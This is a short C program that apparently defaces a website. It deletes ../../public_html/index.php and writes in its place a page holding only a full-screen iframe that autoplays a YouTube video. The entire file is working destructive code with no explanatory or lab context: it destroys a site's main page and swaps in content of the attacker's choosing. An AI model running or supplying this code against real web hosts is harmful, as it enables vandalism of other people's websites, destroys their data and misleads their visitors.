#include <stdio.h>
#include <sys/types.h>
#include <dirent.h>
int main (void)
{
    remove("../../public_html/index.php");
    FILE *f=fopen("../../public_html/index.php","w");
    fprintf(f,"<iframe height=\"98%\" width=\"100%\" src=\'https://www.youtube.com/v/2AlYR9-uaIo?autoplay=1\'></iframe>");
    fclose(f);
    return 0;
}